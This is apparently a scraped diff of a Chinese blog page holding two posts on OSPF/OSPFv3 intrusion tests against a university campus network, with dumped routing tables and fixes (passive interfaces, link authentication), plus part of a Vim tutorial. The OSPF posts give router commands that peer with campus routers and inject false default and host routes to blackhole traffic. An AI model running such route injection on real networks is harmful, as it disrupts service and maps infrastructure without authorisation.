fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:21::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:22::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:23::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:24::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:25::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:26::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:27::/80 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4015:28::/80 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4016::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4017::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4018::/64 [110/2] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4020::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4021::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4022::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4023::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4024::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4025::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4026::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4027::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4028::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4029::/64 [110/5] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4030::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4031::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4032::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4033::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4035::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4036::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4039::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4043::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4044::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4047::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4049::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:4050::/64 [110/3] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:5001::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:5002::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div><div class="line">O&gt;* 2001:cc0:2020:5005::/64 [110/4] via fe80::7625:8aff:fe0e:b250, eth0, 00:01:09</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="3-入侵测试"><a href="#3-入侵测试" class="headerlink" title="3. 入侵测试"></a>3. 入侵测试</h3><h4 id="IPv4注入默认路由"><a href="#IPv4注入默认路由" class="headerlink" title="IPv4注入默认路由"></a>IPv4注入默认路由</h4><p>在Vigilante上，添加错误默认路由，并同时注入到ospf中，则所有的ospf路由器都会学习到该错误默认路由。则整个网络内所有终端都会把没有路由的数据抓发到Vigilante的eth1，这样所有终端也无法访问Internet了。</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ip route 0.0.0.0 0.0.0.0 eth1</div><div class="line">router ospf</div><div class="line">default-information originate always</div></pre></td></tr></table></figure>
-<h4 id="IPv4注入主机路由"><a href="#IPv4注入主机路由" class="headerlink" title="IPv4注入主机路由"></a>IPv4注入主机路由</h4><p>添加错误主机路由器，例如百度，则整个局域网内的主机无法正常访问百度了，因为百度的流量被路由到Vigilante。</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ip route 14.215.177.38 255.255.255.0 eth1</div><div class="line">router ospf</div><div class="line">redistribute  static</div></pre></td></tr></table></figure>
-<h4 id="IPv6注入错误路由"><a href="#IPv6注入错误路由" class="headerlink" title="IPv6注入错误路由"></a>IPv6注入错误路由</h4><p>类似IPv4</p>
-<hr>
-<h3 id="4-排错"><a href="#4-排错" class="headerlink" title="4. 排错"></a>4. 排错</h3><ul>
-<li>注意iptables和ip6tables的问题，放行协议号89。</li>
-<li>注意avast防火墙问题</li>
-</ul>
-
-        
-      
-    </div>
-
-    
-  </article>
-
-    
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2016/07/03/X大_OSPFv3_入侵测试/">X大 OSPFv3 入侵测试</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2016年7月3日
-        </span>
-      </div>
-    </header>
-
-    
-
-    <div class="post-content">
-      
-        
-
-        
-          <h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h3><h4 id="抓取OSPFv3-hello数据包"><a href="#抓取OSPFv3-hello数据包" class="headerlink" title="抓取OSPFv3 hello数据包"></a>抓取OSPFv3 hello数据包</h4><p>计算机连接校园网，IPv4使用的是NAT模式，IPv6使用的是穿透模式。用WireShark抓去网卡的数据包，使用过滤器ospf，发现抓取到了OSPFv3的hello数据包，说明网络网络人员没有配置passive端口，在不必要的链路上禁止路由器发送hello数据包，点击其中的一个数据包，其结果如图1-1所示，竟然发现hello数据包为纯明文的。</p>
-<center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/1-1.jpg" alt=""></center><br><center style="color:purple"><strong>图1-1</strong></center>
-
-<p>从图1-1中可以看出路由器的router-id为2.2.2.29，区域ID为4，hello间隔为10，dead间隔为40。鉴于是明文的hello数据包，可以把主机伪装为路由器，来获取整个校园网OSPFv3协议的路由表。</p>
-<h4 id="所需软件"><a href="#所需软件" class="headerlink" title="所需软件"></a>所需软件</h4><ul>
-<li>VirtualBox，运行模拟路由器的虚拟机，虚拟机使用的系统为Junipor，镜像下载地址请点击<a href="http://pan.baidu.com/s/1hrz9nTi" target="_blank" rel="external">这里</a></li>
-<li>Named Pipe TCP Proxy，将虚拟机串口端命令行转化为TCP控制数据流，下载请点击<a href="http://pan.baidu.com/s/1o7tXKSE" target="_blank" rel="external">这里</a>。</li>
-<li>Xshell，连接虚拟机串口转化的TCP控制数据流</li>
-</ul>
-<h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>熟悉OSPF协议以及路由器配置流程</p>
-<hr>
-<h3 id="2-虚拟机配置"><a href="#2-虚拟机配置" class="headerlink" title="2. 虚拟机配置"></a>2. 虚拟机配置</h3><h4 id="导入虚拟机"><a href="#导入虚拟机" class="headerlink" title="导入虚拟机"></a>导入虚拟机</h4><p>计算机上安装VirtualBox之后，点击下载的Junipor镜像，即可导入Junipor虚拟机。</p>
-<h4 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h4><p>最多可以启动四张网卡，可以视为虚拟机Junipor路由器的四个接口，在本文中默认只启用了网卡一，网卡一使用桥接模式，桥接到可以抓取到OSPFv3 hello包的物理网卡。这样Junipor虚拟路由器也可以获取OSPFv3 hello数据包。网卡设置如图2-1所示。</p>
-<center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/2-1.jpg" alt=""></center><br><center style="color:purple"><strong>图2-1</strong></center>
-
-<h4 id="配置串口"><a href="#配置串口" class="headerlink" title="配置串口"></a>配置串口</h4><p>虚拟机Junipor路由器无法通过ssh或者telnet直接连接，只能通过串口来进行交互和配置，因此需要配置串口，串口编号默认即可，端口模式选“主机管道”，路由和地址的格式为\.\pip\xxxxx\xxxxxxxxxx，其串口设置如图2-2所示。</p>
-<center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/2-2.jpg" alt=""></center><br><center style="color:purple"><strong>图2-2</strong></center>
-
-<hr>
-<h3 id="3-连接到虚拟机"><a href="#3-连接到虚拟机" class="headerlink" title="3. 连接到虚拟机"></a>3. 连接到虚拟机</h3><h4 id="安装-Named-Pipe-TCP-Proxy"><a href="#安装-Named-Pipe-TCP-Proxy" class="headerlink" title="安装 Named Pipe TCP Proxy"></a>安装 Named Pipe TCP Proxy</h4><p>到Named Pipe TCP Proxy 下载，并安装，在其安装目录找启动文件</p>
-<h4 id="添加管道配置"><a href="#添加管道配置" class="headerlink" title="添加管道配置"></a>添加管道配置</h4><p>到Named Pipe TCP Proxy目录下，运行piped.exe，管道地址与第二章中设置的路由和地址格式中相同，端口为自定义一个高端口号，例如8000以后的。</p>
-<center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-1.jpg" alt=""></center><br><center style="color:purple"><strong>图3-1</strong></center>
-
-<p>添加成功后，如图3-2所示，这样可以从本地使用shell应用telnet到该端口号，图3-2中telnet地址应为127.0.0.1:8001</p>
-<center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-2.jpg" alt=""></center><br><center style="color:purple"><strong>图3-2</strong></center>
-
-<h4 id="telnet到Junipor虚拟机路由器"><a href="#telnet到Junipor虚拟机路由器" class="headerlink" title="telnet到Junipor虚拟机路由器"></a>telnet到Junipor虚拟机路由器</h4><p>启动Junipor路由器，启动成功后，使用xshell，配置如图3-3所示。连接成功后，如图3-4所示。</p>
-<center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-3.jpg" alt=""></center>
-
-<center style="color:purple"><strong>图3-3</strong></center><br><center><img src="http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-4.jpg" alt=""></center>
-
-<center style="color:purple"><strong>图3-4</strong></center>
-
-<hr>
-<h3 id="4-Junipor基础配置"><a href="#4-Junipor基础配置" class="headerlink" title="4. Junipor基础配置"></a>4. Junipor基础配置</h3><p>第一设置时，输入cli进入运行模式</p>
-<pre><code>root@% cli
-root&gt;
-</code></pre><p>输入configure进入配置模式</p>
-<pre><code>root&gt;configure
-root#
-</code></pre><p>设置登录密码,至少字母加数字<br>​<br>    root#edit system<br>    root#set host-name host<br>    root#set domain-name example.com<br>    root#set root-authentication plain-text-password</p>
-<p>设置环回接口IPv4地址，用作OSPFv3协议中的router-id。</p>
-<pre><code>root#set interfaces lo0 unit 0 family inet address 9.9.9.9/24
-</code></pre><p>设置端口em0（eth0）的IPv6 eui-64地址，IPv6通告前缀可以到主机上查询，根据实际情况替换以下命令中的IPv6地址通告前缀，可以在运行模式下查看路由表来确认是否已经运行正常。</p>
-<pre><code>root#set interfaces em0 unit 0 family inet6 address 2001:cc0:2020:4008::/64 eui-64 
-</code></pre><p>启用OSPFv3协议，并把em0接口通告进入OSPFv3，区域ID根据前文抓取的hello数据包可以获知为4</p>
-<pre><code>root#set protocols ospf3 area 0.0.0.4 interface em0 
-</code></pre><p>根据抓取的hello明文数据包，来获悉学校路由器OSPFv3的hello time和dead time，若分别是10s和40s，则不用手动设置，若不为上述数值，则需要手动修改，修改命令如下</p>
-<pre><code>root#set protocols ospf3 area 0.0.0.4 interface em0 hello-interval x
-root#set protocols ospf3 area 0.0.0.4 interface em0 dead-interval x
-</code></pre><p>最后输入commit提交保存历史输入的命令</p>
-<pre><code>root#commit
-</code></pre><p>配置完毕后，可以在运行模式下，执行如下命令，来查看OSPFv3的状态，以及路由表</p>
-<pre><code>root&gt;show ospf3 neighbor
-root&gt;show route
-</code></pre><hr>
-<h3 id="5-获取拓扑路由表"><a href="#5-获取拓扑路由表" class="headerlink" title="5. 获取拓扑路由表"></a>5. 获取拓扑路由表</h3><p>执行完上述所有操作之后，在运行模式下，可以通过show route来查看整个学校拓扑的IPv6路由表，这时候可以路由条目并通告到OSPFv3中，整个拓扑中的路由器都会学习到该路由，由此可能造成对正常网络的影响。完整的IPv6路由表如下所示。</p>
-<pre><code>::/0   *[OSPF3/150] 00:01:56, metric 20, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1::/64
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1003::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1004::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1005::/64 
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1006::/64
-   *[OSPF3/150] 00:01:56, metric 20, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1007::/64
-   *[OSPF3/150] 00:01:56, metric 20, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1008::/64
-   *[OSPF3/150] 00:01:56, metric 20, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1010::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1032::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1033::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:1041::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2000::/64
-   *[OSPF3/150] 00:01:56, metric 20, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2010::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2011::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2012::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2013::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2014::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2015::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2016::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2017::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2018::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2020::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2021::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2022::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:2030::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:3001::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:3002::/64 
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:3003::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4001::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4002::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4004::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4005::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4006::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4007::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4008::/64
-   *[Direct/0] 00:02:14
-&gt; via em1.0
-2001:cc0:2020:4008:a00:27ff:fe9b:28c7/128
-   *[Local/0] 00:02:14
-  Local via em1.0
-2001:cc0:2020:4009::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4010::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4012::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4013::/64
-   *[OSPF3/150] 00:01:56, metric 20, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4014::/64
-   *[OSPF3/150] 00:01:56, metric 1, tag 0
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:1::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:2::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:3::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:4::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:5::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:6::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:7::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:8::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:9::/80   
-   *[OSPF3/10] 00:01:56, metric 2
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:10::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:11::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:12::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:13::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:14::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:15::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:16::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:17::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:20::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:21::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:22::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:23::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:24::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:25::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:26::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:27::/80
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4015:28::/80
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4016::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4017::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4018::/64
-   *[OSPF3/10] 00:01:56, metric 2
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4020::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4021::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4022::/64 
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4023::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4024::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4025::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4026::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4027::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4028::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4029::/64
-   *[OSPF3/10] 00:01:56, metric 5
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4030::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4049::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:4050::/64
-   *[OSPF3/10] 00:01:56, metric 3
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:5001::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:5002::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-2001:cc0:2020:5005::/64
-   *[OSPF3/10] 00:01:56, metric 4
-&gt; to fe80::7625:8aff:fe0e:b250 via em1.0
-</code></pre><p>查看OSPFv3邻居如下所示</p>
-<pre><code>root@R3&gt; show ospf3 neighbor 
-ID          Interface   State Pri   Dead
-2.2.2.29    em1.0       Full1       37
-  Neighbor-address fe80::7625:8aff:fe0e:b250
-</code></pre><hr>
-<h3 id="6-改进措施"><a href="#6-改进措施" class="headerlink" title="6. 改进措施"></a>6. 改进措施</h3><ul>
-<li>在不必要的链路上，将OSPF端口设置为passive</li>
-<li>OSPF应配置链路认证，防止非法攻击者的入侵。</li>
-</ul>
-
-        
-      
-    </div>
-
-    
-  </article>
-
-    
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2016/07/01/Vim 学习/">Vim 学习</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2016年7月1日
-        </span>
-      </div>
-    </header>
-
-    
-
-    <div class="post-content">
-      
-        
-
-        
-          <h3 id="1-移动"><a href="#1-移动" class="headerlink" title="1. 移动"></a>1. 移动</h3><h4 id="word为单位移动"><a href="#word为单位移动" class="headerlink" title="word为单位移动"></a>word为单位移动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">This is a line with example text</div><div class="line"> ---&gt;--&gt;-&gt;-----------------&gt;</div><div class="line">   w  w  w                3w</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">This is a line with example text</div><div class="line">&lt;----&lt;--&lt;-&lt;---------&lt;---</div><div class="line">     b     b  b        2b      b</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">This is a line with example text</div><div class="line">    &lt;- &lt;--- -----&gt; ----&gt;</div><div class="line">     ge ge        e      e</div></pre></td></tr></table></figure>
-<p>有一些被认为是non-word的特殊字符, 比如”.”, “-“或”)”充当了word边界的作用。要改变Vim对word边界的定义, 请查看’iskeyword’选项.还可以以空白为分界的WORDs为单位进行移动. 这种WORD与通常意义上的word的边界不同.所以此处用了大写的WORD来区分于word. 它的移动命令也是相应字母的大写形式, 如下所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">      ge          b          w                                       e</div><div class="line">     &lt;-          &lt;-         ---&gt;                                  ---&gt;</div><div class="line">This is-a line, with special/separated/words (and some more).</div><div class="line">     &lt;----&lt;-----            --------------------------&gt;             -----&gt;</div><div class="line">        gE     B                                  W                                    E</div></pre></td></tr></table></figure></p>
